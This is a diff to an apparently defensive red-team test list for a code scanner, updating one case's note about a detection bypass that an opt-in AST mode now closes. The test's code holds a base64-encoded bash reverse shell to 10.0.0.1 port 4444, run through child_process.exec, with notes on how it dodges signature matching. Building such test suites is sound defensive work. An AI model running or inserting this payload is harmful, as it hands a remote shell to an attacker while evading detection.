@@ -115,7 +115,7 @@ module.exports = [
     id: 'revsh-base64-devtcp',
     category: 'reverse-shell', technique: 'base64-cmd-evasion', severity: 'CRITICAL',
     expected: 'BLOCK', knownBypass: true,
-    description: 'The /dev/tcp command is base64-encoded and shelled out via bash -c (no plaintext /dev/tcp literal, and decode+exec is not eval so OBFUSCATED_CODE_EXECUTION does not fire)',
+    description: 'The /dev/tcp command is base64-encoded and shelled out via bash -c (no plaintext /dev/tcp literal, and decode+exec is not eval so OBFUSCATED_CODE_EXECUTION does not fire). CLOSED under FW_ENABLE_AST=1 (Phase 3, opt-in): the base64 decode is folded and the resulting command re-matched against the existing signature set — see `npm run redteam:ast`.',
     code: `
       const p = Buffer.from('YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=', 'base64').toString();
       require('child_process').exec('bash -c "' + p + '"');
